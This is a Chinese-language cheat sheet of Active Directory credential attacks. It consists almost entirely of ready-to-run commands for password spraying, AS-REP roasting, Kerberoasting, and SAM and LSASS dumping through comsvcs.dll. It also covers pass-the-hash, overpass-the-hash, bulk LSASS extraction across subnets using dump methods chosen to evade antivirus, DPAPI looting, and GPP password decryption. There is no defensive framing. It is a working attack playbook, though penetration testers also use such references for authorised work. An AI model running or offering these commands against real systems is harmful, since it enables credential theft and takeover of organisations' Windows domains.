# AD 域凭据攻击详解

## 密码喷洒

**先查密码策略**：`net accounts /domain` 看锁定阈值和重置时间。
```bash
# 查看密码策略
netexec ldap DC_IP -u USER -p PASS --pass-pol
net accounts /domain    # Lockout threshold / duration / observation window

# 一次只喷一个密码（避免锁定）
netexec smb DC_IP -u userlist.txt -p 'Company2024!' --continue-on-success
# 多协议验证
netexec smb DC_IP -u userlist.txt -p 'Password1!' --continue-on-success
netexec winrm DC_IP -u userlist.txt -p 'Password1!' --continue-on-success
netexec rdp DC_IP -u userlist.txt -p 'Password1!' --continue-on-success
```

### 常见密码模式
```
Company2024!    # 公司名+年份+符号
Spring2024      # 季节+年份
Welcome1!       # 通用弱密码
P@ssw0rd        # 经典
Qwer1234!       # 键盘规律
Admin@123       # 管理员常用
```

### kerbrute 喷洒（更快且不触发账户锁定日志）
```bash
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password1!'
```

## AS-REP Roasting

针对不需要 Kerberos 预认证的用户（无需凭据即可攻击）：
```bash
# 枚举不需要预认证的用户
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# 如果已有域凭据，可以自动查找
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile asrep.txt

# 破解
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# 或
john --format=krb5asrep asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Kerberoasting

针对注册了 SPN 的服务账户（需要任意域用户凭据）：
```bash
# 枚举 SPN 并请求票据
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt

# 破解
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# RC4 加密(etype 23): hashcat -m 13100
# AES256 加密(etype 18): hashcat -m 19700
```
服务账户密码通常比用户密码更弱（设置后很少更改）。

## NTLM Hash 获取与利用

### SAM 数据库（本地 Hash）
```bash
# 远程 dump
impacket-secretsdump DOMAIN/ADMIN:PASS@TARGET
# 本地提取（reg save）
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM sys.hiv
impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL
```

### LSASS 内存（域凭据/明文密码）
```bash
# comsvcs.dll MiniDump（不需要上传工具）
tasklist /fi "imagename eq lsass.exe"    # 获取 LSASS PID
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump PID C:\Windows\Temp\lsass.dmp full
# 离线分析
pypykatz lsa minidump lsass.dmp
```

### Pass-the-Hash
```bash
netexec smb 10.0.0.0/24 -u admin -H NTLM_HASH --continue-on-success
impacket-psexec -hashes :NTLM_HASH DOMAIN/admin@TARGET
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/admin@TARGET
evil-winrm -i TARGET -u admin -H NTLM_HASH
```

## Overpass-the-Hash（NTLM → Kerberos TGT）
```bash
# 用 NTLM Hash 获取 TGT（在 Kerberos-only 环境中有用）
impacket-getTGT DOMAIN/USER -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=USER.ccache
impacket-psexec -k -no-pass DOMAIN/USER@TARGET
```

## 远程凭据收割工具

### lsassy — 远程 LSASS 凭据提取
```bash
# 远程导出 LSASS（无需 RDP/交互式登录）
lsassy -d DOMAIN -u USER -p PASSWORD TARGET
lsassy -d DOMAIN -u USER -H NTLM_HASH TARGET

# 批量提取（整个网段）
lsassy -d DOMAIN -u USER -p PASSWORD 10.0.0.0/24

# 指定导出方式（规避 AV）
lsassy -d DOMAIN -u USER -p PASSWORD TARGET -m comsvcs
lsassy -d DOMAIN -u USER -p PASSWORD TARGET -m nanodump
```

### donpapi — DPAPI 凭据收割
```bash
# 收割目标机器上的 DPAPI 保护凭据（浏览器密码、Wi-Fi、RDP、证书等）
donpapi DOMAIN/USER:PASSWORD@TARGET
donpapi DOMAIN/USER@TARGET -hashes :NTLM_HASH

# 批量收割
donpapi DOMAIN/USER:PASSWORD@TARGET1 DOMAIN/USER:PASSWORD@TARGET2

# 指定输出目录
donpapi DOMAIN/USER:PASSWORD@TARGET -output-dir /tmp/dpapi_loot
```

### pypykatz — 本地 LSASS dump 离线分析
```bash
# 解析本地 lsass dump 文件
pypykatz lsa minidump lsass.dmp

# 解析注册表 hive（SAM/SYSTEM/SECURITY）
pypykatz registry --sam SAM --system SYSTEM --security SECURITY

# 从 AD 数据库提取凭据
pypykatz lsa nt /path/to/ntds.dit -system SYSTEM
```

### gpp-decrypt — 组策略密码解密
```bash
# 解密 Groups.xml 中的 cpassword（GPP 密码）
gpp-decrypt "ENCRYPTED_CPASSWORD"

# 常见 GPP 密码文件路径
# \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
# \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Services\Services.xml
# \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml

# 自动搜索 SYSVOL 中的 GPP 密码
netexec smb DC_IP -u USER -p PASSWORD -M gpp_password
```
